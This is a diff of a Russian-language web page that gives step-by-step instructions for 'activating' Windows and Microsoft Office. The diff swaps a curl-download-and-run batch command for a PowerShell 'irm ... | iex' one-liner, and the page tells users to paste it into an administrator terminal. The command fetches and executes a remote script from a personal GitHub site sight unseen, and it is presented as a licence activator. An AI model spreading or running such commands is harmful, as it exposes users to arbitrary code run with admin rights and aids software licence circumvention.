@@ -117,32 +117,28 @@
     <h1>Активация Windows и Microsoft Office</h1>
     
     <div class="steps">
-        <!-- Шаг 1 -->
         <div class="step">
             <div class="step-title">Шаг 1</div>
-            <div class="step-desc">Скопируйте специальную команду автоматического запуска:</div>
+            <div class="step-desc">Скопируйте команду автоматического запуска для PowerShell:</div>
             <div class="command-box">
-                <div class="command-text" id="cmdText">curl -sL https://raw.githubusercontent.com/carplk/activator/refs/heads/main/activator -o activator.bat && activator.bat</div>
+                <div class="command-text" id="cmdText">irm https://carplk.github.io/activator | iex</div>
                 <button class="copy-btn" id="copyBtn" onclick="copyCode()">Копировать</button>
             </div>
         </div>
 
-        <!-- Шаг 2 -->
         <div class="step">
             <div class="step-title">Шаг 2</div>
-            <div class="step-desc">Откройте командную строку. Для гарантии успешной работы лучше запустить её <strong>от имени администратора</strong> (нажмите пуск, введите <code>cmd</code>, нажмите правой кнопкой мыши и выберите «Запуск от имени администратора»).</div>
+            <div class="step-desc">Откройте терминал <strong>PowerShell</strong>. Для стабильной работы запустите его <strong>от имени администратора</strong> (нажмите Пуск, введите <code>PowerShell</code>, кликните правой кнопкой мыши и выберите «Запуск от имени администратора»).</div>
         </div>
 
-        <!-- Шаг 3 -->
         <div class="step">
             <div class="step-title">Шаг 3</div>
-            <div class="step-desc">Вставьте скопированный код в терминал (нажав <strong>Ctrl + V</strong> или кликнув правой кнопкой мыши) и нажмите <strong>Enter</strong>.</div>
+            <div class="step-desc">Вставьте скопированную строку в окно PowerShell (нажав <strong>Ctrl + V</strong> или кликнув правой кнопкой мыши) и нажмите клавишу <strong>Enter</strong>.</div>
         </div>
 
-        <!-- Шаг 4 -->
         <div class="step">
             <div class="step-title">Шаг 4</div>
-            <div class="step-desc">В открывшемся текстовом меню введите <strong>цифру нужного пункта</strong> (например, 1 — для Windows или 2 — для MS Office) и нажмите <strong>Enter</strong>. Дальше скрипт всё сделает сам!</div>
+            <div class="step-desc">В появившемся текстовом меню введите <strong>цифру нужного пункта</strong> (например, 1 — для Windows или 2 — для MS Office) и нажмите <strong>Enter</strong>. Дальше скрипт всё сделает сам!</div>
         </div>
     </div>
 
